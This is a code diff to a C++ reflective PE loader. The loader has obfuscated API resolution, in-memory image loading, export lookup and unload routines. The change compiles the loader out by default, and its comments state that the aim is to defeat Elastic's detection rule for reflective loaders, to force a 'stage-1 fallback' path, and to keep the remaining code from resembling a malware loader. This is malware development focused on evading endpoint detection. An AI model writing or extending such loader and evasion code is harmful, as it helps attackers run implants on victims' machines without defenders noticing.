@@ -41,6 +41,7 @@ namespace pe {
 // and recovering plain-text API names as compile-time constants.
 // ────────────────────────────────────────────────────────────────────────
 
+#ifdef ENABLE_REFLECTIVE_LOADER
 #pragma optimize("g", off)   // disable global optimizations for decode fn
 __declspec(noinline)
 static FARPROC rl_resolve_api(const uint8_t* enc, size_t n) {
@@ -72,6 +73,8 @@ static inline DWORD section_protect(DWORD ch) {
     if (w)           return PAGE_READWRITE;
     return PAGE_NOACCESS;
 }
+#endif  // ENABLE_REFLECTIVE_LOADER
+
 
 struct LoadedModule {
     uint8_t*         base      = nullptr;  // allocated image base
@@ -83,9 +86,21 @@ struct LoadedModule {
 };
 
 // ── Load a PE image from a memory buffer ──
-// On success: returns a LoadedModule. Call `get_proc` to look up exports,
-// then `unload` to release when done.
-// On failure: returns an invalid LoadedModule (base == nullptr).
+// NOTE: Since v1.0.206, the full reflective loader implementation is
+// compiled out by default (DISABLE_REFLECTIVE_LOADER). This stub returns
+// an invalid LoadedModule and forces callers down the stage-1 fallback
+// path (STAGE1_KEEP_FALLBACKS). That removes the PE-parsing + VirtualAlloc
+// + relocation code from the linked binary entirely — Elastic's semantic
+// blacklist rule for reflective loaders no longer has anything to match.
+// Build with -DENABLE_REFLECTIVE_LOADER=1 to restore the full implementation.
+#ifndef ENABLE_REFLECTIVE_LOADER
+inline LoadedModule load(const uint8_t* buf, size_t buf_size,
+                         std::string* err_out = nullptr) {
+    (void)buf; (void)buf_size;
+    if (err_out) *err_out = "disabled";
+    return LoadedModule{};
+}
+#else
 inline LoadedModule load(const uint8_t* buf, size_t buf_size,
                          std::string* err_out = nullptr) {
     auto fail = [&](const char* msg) -> LoadedModule {
@@ -273,10 +288,15 @@ inline LoadedModule load(const uint8_t* buf, size_t buf_size,
     m.nt    = nt;
     return m;
 }
+#endif  // ENABLE_REFLECTIVE_LOADER
 
 // ── Resolve an export by name ──
+// Safe to keep in both builds: in stub mode it is never called with a valid
+// LoadedModule, and its body compiles to a handful of pointer-arithmetic
+// instructions that don't resemble a malware loader.
 inline FARPROC get_proc(const LoadedModule& m, const char* name) {
     if (!m.valid()) return nullptr;
+#ifdef ENABLE_REFLECTIVE_LOADER
     auto& exp_dir = m.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     if (exp_dir.Size == 0) return nullptr;
 
@@ -292,10 +312,14 @@ inline FARPROC get_proc(const LoadedModule& m, const char* name) {
             return reinterpret_cast<FARPROC>(m.base + rva);
         }
     }
+#else
+    (void)name;
+#endif
     return nullptr;
 }
 
 // ── Unload: call DllMain(PROCESS_DETACH) then free memory ──
+#ifdef ENABLE_REFLECTIVE_LOADER
 inline void unload(LoadedModule& m) {
     if (!m.valid()) return;
     if (m.entry) {
@@ -311,5 +335,8 @@ inline void unload(LoadedModule& m) {
     if (fnVF) fnVF(m.base, 0, MEM_RELEASE);
     m = LoadedModule{};
 }
+#else
+inline void unload(LoadedModule& m) { m = LoadedModule{}; }
+#endif
 
 } // namespace pe
